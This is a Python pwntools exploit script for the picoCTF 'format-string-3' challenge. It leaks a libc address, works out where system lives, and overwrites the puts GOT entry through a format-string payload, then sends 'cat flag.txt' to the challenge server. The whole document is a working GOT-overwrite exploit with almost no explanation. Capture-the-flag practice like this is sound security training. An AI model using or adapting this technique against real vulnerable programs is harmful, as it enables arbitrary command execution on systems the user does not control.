#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
def exec_fmt(payload):
    p = process('./format-string-3')
    print(p.recvuntil(b'libc: 0x').decode())
    setvbuf_got = int(p.recvline(keepends=False).decode(), 16)
    p.sendline(payload)
    a = p.recvline(keepends=False)
    print(p.clean(0.2).decode())
    return a

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# p = process('./format-string-3', shell=True)
p = process('nc rhea.picoctf.net 53722', shell=True)

print(p.recvuntil(b'libc: 0x').decode())
setvbuf_got = int(p.recvline(keepends=False).decode(), 16)

# position of puts in GOT:
addr = 0x404018
# new value pointing to system
# objdump -T libc.so.6 | grep -E ' setvbuf$| system$'

system_in_got = setvbuf_got - 0x7a3f0 + 0x4f760

payload = fmtstr_payload(offset, {addr: system_in_got})
payload += b'\ncat flag.txt\n'
with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"Payload length is {len(payload)} bytes")
p.sendline(payload)
print(p.clean())
